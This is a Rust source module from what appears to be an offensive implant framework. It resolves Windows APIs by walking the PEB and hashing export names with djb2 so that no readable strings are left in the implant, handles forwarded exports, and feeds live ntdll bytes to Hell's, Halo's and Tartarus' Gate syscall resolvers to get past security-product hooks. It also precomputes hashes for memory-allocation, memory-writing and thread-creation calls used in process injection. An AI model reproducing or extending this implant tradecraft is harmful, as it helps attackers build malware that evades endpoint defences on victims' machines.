//! PEB-walk API resolution + djb2 hashing.
//!
//! A position-independent implant has no IAT and no loader help: it must find
//! `ntdll.dll` itself (via the Process Environment Block), walk its export
//! table, and resolve the functions it needs by hash (names are strings —
//! scanning for them by literal is brittle; djb2 over the name is the standard
//! PIC idiom, same trick Rustic64/Stardust use).
//!
//! This module also bridges to `nyx_evasion`: a [`LiveNtdll`] implements
//! [`nyx_evasion::SyscallSource`] so the SSN-resolution algorithms
//! (Hell's/Halo's/Tartarus' Gate) run over the *real* ntdll bytes instead of a
//! fixture — turning the evasion crate from a unit-tested algorithm into a
//! live runtime.
//!
//! All of this is `cfg(target_os = "windows")` — it does not compile on the
//! macOS dev host (PEB layout is Windows-only). `cargo +nightly check` on the
//! windows-gnu target validates the types.

#![cfg(target_os = "windows")]

use crate::heap::{self, String, Vec};
type HeapStr = heap::Str;
use core::ffi::c_void;

/// djb2 hash of a byte string (case-insensitive for module names, as Windows
/// loaders match case-insensitively). Used to match API/module names without
/// holding string literals in the implant.
pub fn djb2(s: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &b in s {
        // tolower for module-name matching (API names are already lowercase in ntdll).
        let c = b.to_ascii_lowercase();
        h = h.wrapping_mul(33).wrapping_add(c as u32);
    }
    h
}

/// djb2 hash over the low byte of each `u16` in a UTF-16 slice.
/// Used to match module names from the PEB loader list (UTF-16)
/// without holding string literals in the implant.
pub fn djb2_utf16(ptr: *const u16, len: usize) -> u32 {
    let mut h: u32 = 5381;
    for i in 0..len {
        // SAFETY: caller guarantees ptr..ptr+len is a valid UTF-16 slice.
        let c = unsafe { *ptr.add(i) };
        let lo = (c & 0xFF) as u8;
        h = h.wrapping_mul(33).wrapping_add(lo.to_ascii_lowercase() as u32);
    }
    h
}

/// djb2 hash of a null-terminated ASCII C string.
/// PE export names are 8-bit C strings; this avoids pulling them
/// through a slice when the caller just needs the hash.
///
/// # Safety
/// `ptr` must point to a valid, null-terminated ASCII string.
unsafe fn djb2_ascii_z(mut ptr: *const u8) -> u32 {
    let mut h: u32 = 5381;
    while *ptr != 0 {
        h = h
            .wrapping_mul(33)
            .wrapping_add((*ptr).to_ascii_lowercase() as u32);
        ptr = ptr.add(1);
    }
    h
}

/// A resolved module: base address + a view over its PE export directory.
#[derive(Clone, Copy)]
pub struct Module {
    pub base: *mut u8,
    /// The export directory RVA (resolved from the PE data directory).
    pub export_dir_rva: u32,
    pub export_dir_size: u32,
}

impl Module {
    /// Pointer to the export directory (or null if absent).
    fn export_dir(&self) -> *const ExportDirectory {
        if self.export_dir_rva == 0 {
            return core::ptr::null();
        }
        unsafe { self.base.add(self.export_dir_rva as usize) as *const ExportDirectory }
    }

    /// Resolve a function by name hash. Returns its RVA in the module, or 0 if
    /// not found. Walks the AddressOfNames table and hashes each entry.
    pub fn export_rva_by_hash(&self, name_hash: u32) -> u32 {
        let dir = self.export_dir();
        if dir.is_null() {
            return 0;
        }
        unsafe {
            let base = self.base;
            let n = (*dir).number_of_names as usize;
            let num_funcs = (*dir).number_of_functions as usize;
            let names = base.add((*dir).address_of_names as usize) as *const u32;
            let ordinals = base.add((*dir).address_of_name_ordinals as usize) as *const u16;
            let funcs = base.add((*dir).address_of_functions as usize) as *const u32;
            for i in 0..n {
                let name_rva = *names.add(i);
                let name_ptr = base.add(name_rva as usize);
                let h = djb2_ascii_z(name_ptr);
                if h == name_hash {
                    let ord = *ordinals.add(i) as usize;
                    // Bounds check: ordinal index must be within AddressOfFunctions.
                    if ord >= num_funcs {
                        return 0;
                    }
                    return *funcs.add(ord);
                }
            }
        }
        0
    }

    /// (name, rva) for every named export — used to feed the SSN resolver's
    /// `SyscallSource::exports()`. Allocates a Vec, so the heap must be up.
    pub fn named_exports(&self) -> Vec<(HeapStr, u32)> {
        let dir = self.export_dir();
        let mut out = Vec::new();
        if dir.is_null() {
            return out;
        }
        unsafe {
            let base = self.base;
            let n = (*dir).number_of_names as usize;
            let num_funcs = (*dir).number_of_functions as usize;
            let names = base.add((*dir).address_of_names as usize) as *const u32;
            let ordinals = base.add((*dir).address_of_name_ordinals as usize) as *const u16;
            let funcs = base.add((*dir).address_of_functions as usize) as *const u32;
            for i in 0..n {
                let name_rva = *names.add(i);
                let name_ptr = base.add(name_rva as usize);
                // Read the C string into a HeapStr.
                let mut len = 0usize;
                while *name_ptr.add(len) != 0 {
                    len += 1;
                }
                let slice = core::slice::from_raw_parts(name_ptr, len);
                let ord = *ordinals.add(i) as usize;
                // Bounds check: ordinal index must be within AddressOfFunctions.
                if ord >= num_funcs {
                    continue;
                }
                out.push((HeapStr::from_bytes(slice), *funcs.add(ord)));
            }
        }
        out
    }
}

/// IMAGE_EXPORT_DIRECTORY (the relevant fields).
#[repr(C)]
#[derive(Default)]
pub struct ExportDirectory {
    pub characteristics: u32,
    pub time_date_stamp: u32,
    pub major_version: u16,
    pub minor_version: u16,
    pub name: u32,
    pub base: u32,
    pub number_of_functions: u32,
    pub number_of_names: u32,
    pub address_of_functions: u32,
    pub address_of_names: u32,
    pub address_of_name_ordinals: u32,
}

/// The live ntdll, located via the PEB. Implements `SyscallSource` so the
/// evasion crate's SSN resolver runs over real stub bytes.
pub struct LiveNtdll {
    module: Module,
    /// Cached (name, rva) list (built once, borrowed for the lifetime of self).
    exports: Vec<(HeapStr, u32)>,
}

impl LiveNtdll {
    /// Walk the PEB → InLoadOrderModuleList to find ntdll by hash, then parse
    /// its export directory. Returns None if ntdll can't be found (should not
    /// happen in a real process — ntdll is always loaded).
    pub fn locate() -> Option<Self> {
        // SAFETY: PEB walk reads process-global state that is stable post-load.
        let module = unsafe { find_module_by_hash(djb2(b"ntdll.dll")) }?;
        let exports = module.named_exports();
        Some(Self { module, exports })
    }

    /// Locate ntdll's base address WITHOUT allocating. Cheaper than locate()
    /// (no export-name Vec) and safe to call before the allocator is validated.
    /// Returns the raw module base pointer.
    pub fn locate_base() -> Option<*mut u8> {
        // SAFETY: PEB walk reads process-global state that is stable post-load.
        let module = unsafe { find_module_by_hash(djb2(b"ntdll.dll")) }?;
        Some(module.base)
    }

    /// Count named exports WITHOUT allocating (pure pointer walk). Used to test
    /// the export-table traversal independently of the allocator.
    pub fn export_count_no_alloc(&self) -> u32 {
        let base = self.module.base;
        unsafe {
            let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
            let nt = base.add(e_lfanew);
            let opt = nt.add(24);
            let magic = *(opt as *const u16);
            let dd_off = if magic == 0x20B { 112 } else { 96 };
            let export_rva = *(opt.add(dd_off) as *const u32);
            if export_rva == 0 {
                return 0;
            }
            let dir = base.add(export_rva as usize) as *const ExportDirectory;
            (*dir).number_of_names
        }
    }

    /// Read `len` bytes at `rva` from the live ntdll image. Unsafe: rva must
    /// point into a mapped section of ntdll.
    pub unsafe fn read(&self, rva: u32, len: usize) -> Vec<u8> {
        let ptr = self.module.base.add(rva as usize);
        core::slice::from_raw_parts(ptr, len).to_vec()
    }

    /// Raw module handle (for export_rva_by_hash lookups).
    pub fn module(&self) -> Module {
        self.module
    }
}

impl LiveNtdll {
    /// Borrow the (name, rva) export list of the hooked in-process ntdll. Names
    /// and RVAs are intact even when stub *bytes* are inline-hooked (hooks
    /// patch prologues, never the export directory), so this is a safe source
    /// of (name, rva) pairs to pair with a fresh `.text` for byte reads.
    pub fn exports_iter(&self) -> &[(HeapStr, u32)] {
        &self.exports
    }

    /// Resolve the SSN table over the live ntdll. This is the bridge that turns
    /// `nyx_evasion`'s algorithms (Hell's/Halo's/Tartarus' Gate) into a live
    /// runtime result: real stub bytes, real export RVAs.
    ///
    /// Returns an owned Vec — no dangling borrows. The resolver iterates
    /// exports() once internally; we satisfy that by materializing HeapStr→String
    /// into a local Vec that outlives the resolve_table call.
    pub fn resolve_table_owned(&self) -> Vec<(String, u32)> {
        // Materialize exports into owned Strings, then build a source that
        // borrows them for the duration of resolve_table. The borrow is scoped
        // to this function, so no 'static lie.
        let owned: Vec<(String, u32)> = self
            .exports
            .iter()
            .map(|(name, rva)| (name.to_string_lossy(), *rva))
            .collect();
        let src = OwnedSource {
            base: self.module.base,
            exports: &owned,
        };
        nyx_evasion::resolve_table(&src)
    }
}

/// A SyscallSource backed by an owned (String, u32) slice borrowed for the call.
struct OwnedSource<'a> {
    base: *mut u8,
    exports: &'a [(String, u32)],
}

impl<'a> nyx_evasion::SyscallSource for OwnedSource<'a> {
    fn read(&self, rva: u32, len: usize) -> Vec<u8> {
        unsafe {
            let ptr = self.base.add(rva as usize);
            core::slice::from_raw_parts(ptr, len).to_vec()
        }
    }
    fn exports(&self) -> &[(String, u32)] {
        self.exports
    }
}

/// Walk the PEB's InLoadOrderModuleList to find a loaded module by name hash.
unsafe fn find_module_by_hash(name_hash: u32) -> Option<Module> {
    let peb = peb_pointer()?;
    let ldr = (*peb).ldr;
    if ldr.is_null() {
        return None;
    }
    let mut head = (*ldr).in_load_order_module_list.flink;
    let list_start: *const u8 = &(*ldr).in_load_order_module_list as *const _ as *const u8;
    let mut _guard = 0u32;
    while head as *const u8 != list_start && _guard < 256 {
        _guard += 1;
        // in_load_order_links is the first field of ListEntry, so the address of
        // the ListHead == the address of the containing ListEntry (CONTAINING_RECORD
        // with offset 0). Cast directly.
        let entry: *mut ListEntry = head as *mut ListEntry;
        let name_buf = (*entry).base_dll_name.buffer;
        let name_len = (*entry).base_dll_name.length as usize / 2; // bytes->chars
        if !name_buf.is_null() && name_len > 0 {
            let h = djb2_utf16(name_buf, name_len);
            if h == name_hash {
                return Some(parse_module((*entry).dll_base as *mut u8));
            }
        }
        head = (*entry).in_load_order_links.flink;
    }
    None
}

/// Parse a PE base pointer into a Module (base + export data directory).
unsafe fn parse_module(base: *mut u8) -> Module {
    // DOS header → e_lfanew → NT headers → optional header → data dir[0] (export).
    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    let nt = base.add(e_lfanew);
    // PE signature (4) + file header (20) → optional header.
    let opt = nt.add(24);
    let magic = *(opt as *const u16);
    // Export dir is data directory index 0. Its offset in the optional header
    // depends on PE32 (96) vs PE32+ (112).
    let data_dir_off = if magic == 0x20B { 112 } else { 96 };
    let export_rva = *(opt.add(data_dir_off) as *const u32);
    let export_size = *(opt.add(data_dir_off + 4) as *const u32);
    Module {
        base,
        export_dir_rva: export_rva,
        export_dir_size: export_size,
    }
}

// ---- PEB / LDR structures (minimal, hand-rolled for PIC) -------------------

#[repr(C)]
pub struct ListHead {
    pub flink: *mut ListEntry,
    #[allow(dead_code)]
    pub blink: *mut ListEntry,
}

#[repr(C)]
pub struct ListEntry {
    pub in_load_order_links: ListHead,
    #[allow(dead_code)]
    pub in_memory_order_links: ListHead,
    #[allow(dead_code)]
    pub in_initialization_order_links: ListHead,
    pub dll_base: *mut c_void,
    #[allow(dead_code)]
    pub entry_point: *mut c_void,
    #[allow(dead_code)]
    pub size_of_image: u32,
    #[allow(dead_code)]
    pub full_dll_name: UnicodeString,
    pub base_dll_name: UnicodeString,
}

// Note: there is no CONTAINING_RECORD helper method here. Because
// in_load_order_links is the first field of ListEntry, the address of the
// ListHead (flink target) IS the address of the ListEntry — callers cast the
// raw pointer directly (see find_module_by_hash).

#[repr(C)]
#[derive(Clone, Copy)]
pub struct UnicodeString {
    pub length: u16,
    #[allow(dead_code)]
    pub maximum_length: u16,
    pub buffer: *const u16,
}

#[repr(C)]
pub struct Peb {
    #[allow(dead_code)]
    pub inherited_address_space: u8,
    #[allow(dead_code)]
    pub read_image_file_exec_options: u8,
    #[allow(dead_code)]
    pub being_debugged: u8,
    #[allow(dead_code)]
    pub bit_field: u8,
    #[allow(dead_code)]
    pub _padding: [u8; 4],
    #[allow(dead_code)]
    pub mutant: *mut c_void,
    #[allow(dead_code)]
    pub image_base_address: *mut c_void,
    /// Ldr pointer — at offset 0x18 on x64 (matches the real PEB layout).
    pub ldr: *mut PebLdr,
}

#[repr(C)]
pub struct PebLdr {
    #[allow(dead_code)]
    pub length: u32,
    #[allow(dead_code)]
    pub initialized: u32,
    #[allow(dead_code)]
    pub ss_handle: *mut c_void,
    /// InLoadOrderModuleList — at offset 0x10 in PEB_LDR_DATA (x64).
    pub in_load_order_module_list: ListHead,
}

/// Read the PEB pointer. On x64 the TEB is at gs:[0x30] and the PEB at gs:[0x60].
#[cfg(target_arch = "x86_64")]
pub unsafe fn peb_pointer() -> Option<*mut Peb> {
    let peb: *mut Peb;
    core::arch::asm!(
        "mov {p}, gs:[0x60]",
        p = out(reg) peb,
        options(nostack, preserves_flags, readonly),
    );
    Some(peb)
}

#[cfg(not(target_arch = "x86_64"))]
pub unsafe fn peb_pointer() -> Option<*mut Peb> {
    None
}

/// Resolve a function in a loaded module by (module name, function name), both
/// ASCII. Returns the absolute address, or None. No allocation (no Vec/String) —
/// safe to call before the allocator is validated (used by the heap allocator's
/// own bootstrap). This is the same PEB walk + export-table path nyx_selftest
/// proved works on a real Windows host.
pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
    let mod_hash = djb2(module);
    let fn_hash = djb2(func);
    let peb = peb_pointer()?;
    let ldr = (*peb).ldr;
    if ldr.is_null() {
        return None;
    }
    let mut head = (*ldr).in_load_order_module_list.flink;
    let start: *const u8 = &(*ldr).in_load_order_module_list as *const _ as *const u8;
    let mut _guard = 0u32;
    while head as *const u8 != start && _guard < 256 {
        _guard += 1;
        let entry = head as *mut ListEntry;
        let nb = (*entry).base_dll_name.buffer;
        let nl = (*entry).base_dll_name.length as usize / 2;
        if !nb.is_null() && nl > 0 {
            let mh = djb2_utf16(nb, nl);
            if mh == mod_hash {
                let base = (*entry).dll_base as *mut u8;
                return export_addr_by_hash_pub(base, fn_hash);
            }
        }
        head = (*entry).in_load_order_links.flink;
    }
    None
}

/// Walk a module's export table for a function whose name hashes to `fn_hash`.
/// Handles PE forwarded exports (where the RVA falls within the export directory
/// itself, pointing to an ASCII string like "NTDLL.RtlAddVectoredExceptionHandler").
/// These are recursively resolved via PEB walk to avoid jumping into string data.
unsafe fn export_addr_by_hash_pub(base: *mut u8, fn_hash: u32) -> Option<usize> {
    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    let nt = base.add(e_lfanew);
    let opt = nt.add(24);
    let magic = *(opt as *const u16);
    let dd_off = if magic == 0x20B { 112 } else { 96 };
    let export_rva = *(opt.add(dd_off) as *const u32);
    if export_rva == 0 {
        return None;
    }
    // Export-directory SIZE (bytes) is the second u32 of the data directory
    // entry (RVA + size). We must read it from the PE header — NOT use
    // `ExportDirectory.number_of_functions`, which is a *count* of functions,
    // not a byte length. Using the count here under-sized the forwarder bounds
    // check so high-RVA forwarders escaped detection and we returned the
    // forwarder *string* address as if it were code → calling it AV'd
    // (root cause of the hwbp_blind crash: kernel32!AddVectoredExceptionHandler
    // forwards to NTDLL.RtlAddVectoredExceptionHandler at a high RVA).
    let export_dir_size = *(opt.add(dd_off + 4) as *const u32) as usize;
    let dir = base.add(export_rva as usize) as *const ExportDirectory;
    let n = (*dir).number_of_names as usize;
    let num_funcs = (*dir).number_of_functions as usize;
    let names = base.add((*dir).address_of_names as usize) as *const u32;
    let ordinals = base.add((*dir).address_of_name_ordinals as usize) as *const u16;
    let funcs = base.add((*dir).address_of_functions as usize) as *const u32;
    // Forwarder detection: an export RVA that lands inside the export
    // directory itself ([export_rva, export_rva + export_dir_size)) is not code
    // — it's an ASCII forwarder string like "NTDLL.RtlAddVectoredExceptionHandler".
    // Such an RVA must be resolved via the forwarder path, not returned as an
    // address (calling a string → STATUS_ACCESS_VIOLATION).
    let dir_start = export_rva as usize;
    let dir_end = dir_start + export_dir_size;
    for i in 0..n {
        let name_rva = *names.add(i);
        let name_ptr = base.add(name_rva as usize);
        let h = djb2_ascii_z(name_ptr);
        if h == fn_hash {
            let ord = *ordinals.add(i) as usize;
            // Bounds check: ordinal index must be within AddressOfFunctions.
            if ord >= num_funcs {
                return None;
            }
            let fn_rva = *funcs.add(ord);
            // Check for forwarded export: RVA within the export directory.
            if (fn_rva as usize) >= dir_start && (fn_rva as usize) < dir_end {
                return resolve_forwarder(base, fn_rva as usize);
            }
            return Some(base.add(fn_rva as usize) as usize);
        }
    }
    None
}

/// Resolve a PE forwarded export. The forwarder string format is
/// "MODULE.FunctionName" (e.g. "NTDLL.RtlAddVectoredExceptionHandler").
/// Parse, locate the target module via PEB, and resolve the function.
///
/// Note: `find_module_by_hash` matches full loader names (`ntdll.dll`,
/// `kernelbase.dll`), but forwarder strings carry the *abbreviated* base name
/// (`NTDLL`, `KERNELBASE`). We therefore look up via [`find_module_for_forwarder`],
/// which compares the forwarder's module stem against each loader entry's base
/// name (ignoring the `.dll`/`.exe` extension). API-set forwarders
/// (`api-ms-win-...`/`ext-ms-win-...`) are also handled there.
unsafe fn resolve_forwarder(base: *mut u8, forwarder_rva: usize) -> Option<usize> {
    let fwd_ptr = base.add(forwarder_rva);
    // Find the dot separator and end of string.
    let mut dot_pos = 0usize;
    let mut end = 0usize;
    while *fwd_ptr.add(end) != 0 {
        if *fwd_ptr.add(end) == b'.' {
            dot_pos = end;
        }
        end += 1;
    }
    if dot_pos == 0 || dot_pos + 1 >= end {
        return None;
    }
    let mod_part = core::slice::from_raw_parts(fwd_ptr, dot_pos);
    let func_part = core::slice::from_raw_parts(fwd_ptr.add(dot_pos + 1), end - dot_pos - 1);
    let fwd_mod = find_module_for_forwarder(mod_part)?;
    export_addr_by_hash_pub(fwd_mod.base, djb2(func_part))
}

/// Locate a loaded module by the module stem found in a PE forwarder string.
///
/// Forwarder strings use the base name without extension (`NTDLL`,
/// `KERNELBASE`) or an API-set contract name (`api-ms-win-core-console-l1-1-0`).
/// The PEB loader list stores full names (`ntdll.dll`, `kernelbase.dll`), so a
/// plain `find_module_by_hash(djb2(stem))` misses — the hashes can't match.
/// This walks the loader list and compares the stem against each entry's base
/// name, ignoring a trailing `.dll`/`.exe` and matching case-insensitively.
/// API-set names (`api-ms-`/`ext-ms-`-prefixed) are matched literally against
/// the full loader name (the loader resolves them to the host DLL under that
/// exact contract name).
unsafe fn find_module_for_forwarder(stem: &[u8]) -> Option<Module> {
    let is_api_set =
        stem.starts_with(b"api-") || stem.starts_with(b"ext-") || stem.starts_with(b"apiset-");
    let peb = peb_pointer()?;
    let ldr = (*peb).ldr;
    if ldr.is_null() {
        return None;
    }
    let mut head = (*ldr).in_load_order_module_list.flink;
    let list_start: *const u8 = &(*ldr).in_load_order_module_list as *const _ as *const u8;
    let mut _guard = 0u32;
    while head as *const u8 != list_start && _guard < 512 {
        _guard += 1;
        let entry: *mut ListEntry = head as *mut ListEntry;
        let name_buf = (*entry).base_dll_name.buffer;
        let name_len = (*entry).base_dll_name.length as usize / 2; // bytes->chars
        if !name_buf.is_null() && name_len > 0 {
            let chars = core::slice::from_raw_parts(name_buf, name_len);
            if fwd_name_matches(stem, chars, is_api_set) {
                return Some(parse_module((*entry).dll_base as *mut u8));
            }
        }
        head = (*entry).in_load_order_links.flink;
    }
    None
}

/// Compare a forwarder module stem (ASCII) against a loader base name (UTF-16,
/// ASCII-fit). For non-API-set stems, match `stem` to the loader name without
/// its `.dll`/`.exe` extension (case-insensitive). For API-set stems, match the
/// full loader name literally (case-insensitive).
unsafe fn fwd_name_matches(stem: &[u8], loader_name: &[u16], api_set: bool) -> bool {
    // Collect the ASCII lower-cased loader name (ASCII names fit in the low
    // byte of each UTF-16 code unit).
    let mut name: [u8; 64] = [0; 64];
    if loader_name.len() > name.len() {
        // Long names (rare for the modules we forward through) — fall back to
        // a length-bounded compare via direct iteration instead.
        return fwd_name_matches_long(stem, loader_name, api_set);
    }
    let mut nlen = 0usize;
    for &c in loader_name {
        name[nlen] = ((c & 0xFF) as u8).to_ascii_lowercase();
        nlen += 1;
    }
    let name = &name[..nlen];
    let stem_l = stem.len();
    if api_set {
        // API set: full-name literal compare (case-insensitive). The loader
        // surfaces the contract name verbatim.
        if stem_l != nlen {
            return false;
        }
        let mut s = stem.iter();
        let mut n = name.iter();
        loop {
            match (s.next(), n.next()) {
                (Some(&a), Some(&b)) => {
                    if a.to_ascii_lowercase() != b {
                        return false;
                    }
                }
                (None, None) => return true,
                _ => return false,
            }
        }
    }
    // Non-API-set: stem must equal loader name minus an optional ".dll"/".exe".
    // Require the loader name to be exactly stem + ext (so "ntdll" matches
    // "ntdll.dll" but "kernel" does not match "kernelbase.dll").
    let (b0, b1, b2, b3) = if nlen >= 4 {
        (
            name[nlen - 4],
            name[nlen - 3],
            name[nlen - 2],
            name[nlen - 1],
        )
    } else {
        (0, 0, 0, 0)
    };
    let stem_len = if b0 == b'.' && b1 == b'd' && b2 == b'l' && b3 == b'l' {
        nlen - 4
    } else if b0 == b'.' && b1 == b'e' && b2 == b'x' && b3 == b'e' {
        nlen - 4
    } else {
        nlen
    };
    if stem_len != stem_l {
        return false;
    }
    for i in 0..stem_l {
        if stem[i].to_ascii_lowercase() != name[i] {
            return false;
        }
    }
    true
}

/// Unbounded-length fallback for [`fwd_name_matches`] when the loader name
/// exceeds the inline 64-byte buffer (none of the system modules we forward
/// through do, but we must not silently mis-resolve if one does).
unsafe fn fwd_name_matches_long(stem: &[u8], loader_name: &[u16], api_set: bool) -> bool {
    let stem_l = stem.len();
    let nlen = loader_name.len();
    let cmp_stem = |stem_len: usize| -> bool {
        if stem_len != stem_l {
            return false;
        }
        for i in 0..stem_l {
            let lo = ((loader_name[i] & 0xFF) as u8).to_ascii_lowercase();
            if stem[i].to_ascii_lowercase() != lo {
                return false;
            }
        }
        true
    };
    if api_set {
        return cmp_stem(nlen);
    }
    // Strip trailing ".dll"/".exe" if present.
    let ext = if nlen >= 4 {
        let b0 = ((loader_name[nlen - 4] & 0xFF) as u8).to_ascii_lowercase();
        let b1 = ((loader_name[nlen - 3] & 0xFF) as u8).to_ascii_lowercase();
        let b2 = ((loader_name[nlen - 2] & 0xFF) as u8).to_ascii_lowercase();
        let b3 = ((loader_name[nlen - 1] & 0xFF) as u8).to_ascii_lowercase();
        if b0 == b'.' && b1 == b'd' && b2 == b'l' && b3 == b'l' {
            4
        } else if b0 == b'.' && b1 == b'e' && b2 == b'x' && b3 == b'e' {
            4
        } else {
            0
        }
    } else {
        0
    };
    cmp_stem(nlen - ext)
}

// ---- .pdata (exception directory) reader — feeds gap::enumerate_gaps ----
//
// The gap math lives ONLY in nyx-implant-evasionsdk::gap; the implant's job is
// purely to read live .pdata bytes from a mapped module via the PEB walk and
// hand them (as a byte slice + the module's SizeOfImage) to the pure core.
// We do NOT re-parse RUNTIME_FUNCTION_ENTRY or recompute gaps here. See
// docs/WINDOWS_DEV.md §4 (P2.1a-i).

/// A recovered `.pdata` view over a live, mapped module: the raw exception-
/// directory bytes (a sorted array of 12-byte RUNTIME_FUNCTION_ENTRY) + the
/// module's SizeOfImage (the `[0, image_size)` range the table covers) + the
/// module base (so the caller can turn gap RVAs into absolute addresses).
#[derive(Clone, Copy)]
pub struct PdataView {
    /// Raw `.pdata` bytes — feed directly to `gap::RuntimeFunctionEntry::parse_table`.
    pub bytes: &'static [u8],
    /// SizeOfImage from the PE OptionalHeader — the `[0, image_size)` range.
    pub image_size: u32,
    /// Module base address (turn a gap RVA into an absolute address: `base + rva`).
    pub base: *mut u8,
}

/// Read a loaded module's PE headers and return its exception directory
/// (`.pdata`, data-directory index 3) as a `PdataView`. Returns `None` if the
/// module isn't mapped or has no exception directory (some tiny DLLs omit it).
///
/// `base` is the module's mapped base (as recovered from the PEB loader list).
/// This is Windows-only (reads live PE headers via the PEB). The math is
/// deliberately NOT done here — only byte extraction — so the gap algorithm
/// stays single-sourced in `gap.rs`.
///
/// # Safety
/// `base` must point to a currently-mapped PE image (a module in the PEB
/// loader list) and remain mapped for the lifetime of the returned slice.
pub unsafe fn pdata_view(base: *mut u8) -> Option<PdataView> {
    // DOS header → e_lfanew → NT headers → optional header.
    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    let nt = base.add(e_lfanew);
    // PE signature (4) + file header (20) → optional header.
    let opt = nt.add(24);
    let magic = *(opt as *const u16);
    // DataDirectory offset: PE32 (96) vs PE32+ (112). Same convention as
    // parse_module/export_addr_by_hash_pub above — runtime-resolved, never
    // hardcoded per build.
    let dd_off = if magic == 0x20B { 112 } else { 96 };
    // Exception directory = data-directory index 3 (8 bytes each: RVA, size).
    let pdata_rva = *(opt.add(dd_off + 3 * 8) as *const u32);
    let pdata_size = *(opt.add(dd_off + 3 * 8 + 4) as *const u32);
    if pdata_rva == 0 || pdata_size == 0 {
        return None;
    }
    // SizeOfImage is OptionalHeader offset 56 in BOTH PE32 and PE32+ (the PE32
    // BaseOfData+ImageBase == PE32+ ImageBase byte count, so offsets re-align).
    let image_size = *(opt.add(56) as *const u32);
    // Defensive bound: a malformed/corrupt PE could claim a .pdata larger than
    // the whole image. Reject rather than slice past the mapped region.
    if pdata_rva.saturating_add(pdata_size) > image_size {
        return None;
    }
    // SAFETY: the .pdata section of a mapped module is committed readable
    // memory for the process lifetime (the loader maps it). Caller guarantees
    // `base` is a live module; we read a stable, loader-owned region.
    let bytes = core::slice::from_raw_parts(base.add(pdata_rva as usize), pdata_size as usize);
    Some(PdataView {
        bytes,
        image_size,
        base,
    })
}

/// Locate a loaded module by name (ASCII, case-insensitive) via the PEB walk
/// and return its base address, without allocating. Returns `None` if the
/// module isn't in the loader list (e.g. `win32u.dll`/`wow64.dll` may be
/// absent on some builds — callers treat that as "skip this DLL", not fatal).
///
/// Thin wrapper over the same PEB walk `LiveNtdll::locate` uses, just exposing
/// the module base for an arbitrary name so the gap scanner can iterate
/// ntdll / kernelbase / win32u / wow64.
///
/// # Safety
/// PEB walk reads process-global loader state stable post-load.
pub unsafe fn module_base_by_name(name: &[u8]) -> Option<*mut u8> {
    let module = find_module_by_hash(djb2(name))?;
    Some(module.base)
}

/// Well-known module/API hashes (pre-computed djb2) so the implant never holds
/// the literal strings. Recompute with `djb2(b"...")` if these change.
pub mod hashes {
    use super::djb2;
    pub fn ntdll() -> u32 {
        djb2(b"ntdll.dll")
    }
    // Export-name hashes inside ntdll (lowercase, the loader stores them so).
    pub fn nt_allocate_virtual_memory() -> u32 {
        djb2(b"ntallocatevirtualmemory")
    }
    pub fn nt_free_virtual_memory() -> u32 {
        djb2(b"ntfreevirtualmemory")
    }
    pub fn nt_protect_virtual_memory() -> u32 {
        djb2(b"ntprotectvirtualmemory")
    }
    pub fn nt_create_thread_ex() -> u32 {
        djb2(b"ntcreatethreadex")
    }
    pub fn nt_write_virtual_memory() -> u32 {
        djb2(b"ntwritevirtualmemory")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg_attr(target_arch = "x86_64", test)]
    fn djb2_is_stable_and_lowercase() {
        assert_eq!(djb2(b"ntdll.dll"), djb2(b"NTDLL.DLL"));
        assert_ne!(djb2(b"kernel32.dll"), djb2(b"ntdll.dll"));
    }
}
